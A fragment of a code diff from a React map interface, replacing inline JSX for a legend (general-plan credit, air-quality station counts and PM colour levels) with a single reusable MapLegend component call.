-              {t("map.genplanDetailedCredit")}
-            </div>
-          </div>
-        )}
-        {showAirQuality && (
-          <div className="border-t pt-1 mt-1 space-y-0.5">
-            <div className="font-medium text-[10px]">
-              {t("map.pmTitle")}
-              {data.airStations && (
-                <span className="text-muted-foreground font-normal ml-1">
-                  · {t("map.pmStations", { count: data.airStations.length })}
-                </span>
-              )}
-            </div>
-            {(!data.airStations || data.airStations.length < MIN_STATIONS_FOR_HEATMAP) && (
-              <div className="text-[10px] text-muted-foreground max-w-44">
-                {t("map.pmSparse")}
-              </div>
-            )}
-            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-green-500" />{t("map.pmGood")}</div>
-            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-yellow-500" />{t("map.pmModerate")}</div>
-            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-orange-500" />{t("map.pmSensitive")}</div>
-            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-background border-2 border-red-600" />{t("map.pmUnhealthy")}</div>
-          </div>
-        )}
+      <MapLegend seismic={showFaults} air={showAirQuality} genplan={showGenplanDetailed}
+        building={stages.includes("building")} newBuilding={stages.includes("new")}
+        stationCount={data.airStations?.length ?? 0}
+        sparse={!data.airStations || data.airStations.length < MIN_STATIONS_FOR_HEATMAP}
+        riskCounts={riskCounts} />
       </div>
     </div>
   );
